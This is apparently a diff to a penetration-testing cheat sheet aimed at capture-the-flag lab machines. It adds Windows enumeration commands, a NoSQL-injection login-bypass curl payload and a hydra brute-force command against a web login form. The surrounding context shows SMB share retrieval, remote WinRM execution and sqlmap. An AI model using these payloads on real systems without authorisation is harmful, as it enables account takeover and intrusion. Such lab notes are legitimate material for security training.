@@ -144,6 +144,14 @@ Retrieve a folder recursively:
 
     smbget -R -U User smb://10.10.10.178/SHARE\$/XXX/
 
+Display tree
+    
+    tree /F /A
+
+View rights of a directory
+
+     icacls <dir>
+
 ## Powershell
 
 Running remote script directly
@@ -157,6 +165,10 @@ Run WinRM commands from powershell:
     $securePassword = ConvertTo-SecureString $password -AsPlainText -Force
     $credential = New-Object System.Management.Automation.PSCredential $username, $securePassword
     Invoke-Command -Credential $credential -ScriptBlock { whoami } -Computer $computer
+
+Execute command from PowerShell
+
+    cmd /r dir /s /b
 
 ## Common attacks
 
@@ -265,6 +277,13 @@ Port forwarding to access a local postgres server:
 # sqlmap -u http://10.10.10.151/user/login.php --data 'username=test&password=test&submit
 ```
 
+ - NoSQLi
+
+    curl http://site/ --data "username[$ne]=toto&password[$ne]=toto&Submit=Sign+in"
+
+ - BruteForce Online
+
+    hydra -L users.txt -P /usr/share/wordlists/rockyou.txt  website  http-post-form "/:username=^USER^&password=^PASS^&login=login:Forgot Password"
 
 
 # Metasploit
